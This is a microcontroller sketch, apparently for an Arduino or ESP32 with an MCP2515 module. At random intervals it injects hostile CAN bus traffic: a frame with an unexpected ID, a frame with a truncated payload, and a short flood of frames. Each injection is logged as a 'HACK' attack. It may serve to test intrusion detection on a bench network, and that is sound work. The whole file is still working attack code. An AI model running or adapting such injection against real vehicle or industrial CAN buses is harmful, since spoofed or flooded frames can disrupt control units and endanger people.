#include <SPI.h>
#include <mcp2515.h>

struct can_frame canMsg;
MCP2515 mcp2515(15);

// Configurable parameters for time between attacks.
const unsigned long ATTACK_MIN_MS = 2000;   // Min delay between attacks (ms)
const unsigned long ATTACK_MAX_MS = 10000;  // Max delay between attacks (ms)

unsigned long nextAttackAt = 0;

// Helper function to send CAN frames
void sendFrame(uint32_t id, uint8_t dlc, uint8_t data[]) {
  canMsg.can_id = id;
  canMsg.can_dlc = dlc;
  
  for (int i = 0; i < dlc && i < 8; ++i)
    canMsg.data[i] = data[i];

  // This code is hard to follow, but essentially it sends the CAN frame, and prints out
  // the contents (ID, DLC, and Data) of the frame if there were no errors when sending.
  if (mcp2515.sendMessage(&canMsg) == MCP2515::ERROR_OK) {
    Serial.print("HACK: Sent ID 0x"); Serial.print(id, HEX);
    Serial.print(" DLC "); Serial.print(dlc); Serial.print(" Data: ");
    for (int i = 0; i < dlc; i++) {
      Serial.print("0x");
      if (canMsg.data[i] < 16) Serial.print("0");
      Serial.print(canMsg.data[i], HEX);
      Serial.print(" ");
    }
    Serial.println();
  } else {
    Serial.println("HACK: send failed");
  }
}

// Randomly determines the time until next attack.
void scheduleNextAttack() {
  unsigned long interval = random(ATTACK_MIN_MS, ATTACK_MAX_MS + 1);
  nextAttackAt = millis() + interval;
  Serial.print("HACK: Next attack scheduled in ");
  Serial.print(interval);
  Serial.println(" ms");
}

// Sends a hacked CAN frame including a non-compliant CAN ID.
void sendNonCompliantID() {
  uint32_t id = 0x2FF;
  uint8_t payload[8] = { 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 };

  Serial.println("HACK: Sending non-compliant ID attack.");
  sendFrame(id, 8, payload);
  Serial.println("HACK: Non-compliant ID attack complete.");
}

// Sends a hacked CAN frame including a non-compliant data payload.
void sendNonCompliantData() {
  uint32_t id = 0x100;
  uint8_t dlc = 2;
  uint8_t payload[2] = { 0x00, 0x00 };
  Serial.println("HACK: Sending non-compliant data attack.");
  sendFrame(id, dlc, payload);
  Serial.println("HACK: Non-compliant data attack complete.\n");
}

// Sends a quick sequence of CAN frames to flood the CAN bus.
void sendFlood() {
  uint32_t id = 0x100;
  uint8_t dlc = 8;
  uint8_t payload[8] = { 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 };

  Serial.println("HACK: Starting CAN Bus flood attack.");
  for (int i = 0; i < 6; ++i) {
    sendFrame(id, dlc, payload);
    delay(50);
  }
  Serial.println("HACK: Flood attack complete.\n");
}

// Randomly selects which attack to run and schedules it.
void chooseAndRunAttack() {
  int r = random(0, 100);

  if (r < 33) {
    sendNonCompliantID();
  } else if (r < 66) {
    sendNonCompliantData();
  } else {
    sendFlood();
  }

  scheduleNextAttack();
}

void setup() {
  Serial.begin(115200);
  SPI.begin();
  mcp2515.reset();
  mcp2515.setBitrate(CAN_125KBPS, MCP_8MHZ);
  mcp2515.setNormalMode();
  randomSeed(analogRead(34));
  scheduleNextAttack();
}

void loop() {
  unsigned long now = millis();
  if (now >= nextAttackAt) {
    chooseAndRunAttack();
  }
  delay(10);
}